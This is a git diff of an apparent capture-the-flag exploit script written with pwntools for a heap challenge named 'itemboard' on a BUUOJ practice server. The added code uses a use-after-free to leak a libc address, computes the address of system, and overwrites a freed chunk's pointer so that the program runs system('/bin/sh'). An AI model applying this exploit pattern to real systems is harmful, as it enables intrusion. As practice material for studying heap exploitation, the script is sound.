@@ -28,14 +28,39 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './itemboard'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
+p = remote('node3.buuoj.cn', 27012) if argv[1]=='r' else process(binary)
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # start
+def add(name,len,content):
+	sla(':\n','1')
+	sla('?\n',name)
+	sla('?\n',str(len))
+	sla('?\n',content)
 
+def free(index):
+	sla(':\n','4')
+	sla('?\n',str(index))
+
+def show(index):
+	sla(':\n','3')
+	sla('?\n',str(index))
+
+add('chunk0',0x80,'a')
+add('chunk1',0x80,'b')
+free(0)
+show(0)
+ru('tion:')
+base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
+leak('base',base)
+system = base + libc.sym['system']
+
+free(1)
+add('/bin/sh;'+'a'*8+p64(system),0x18,'c')
+free(0)
 # end
 
 itr()
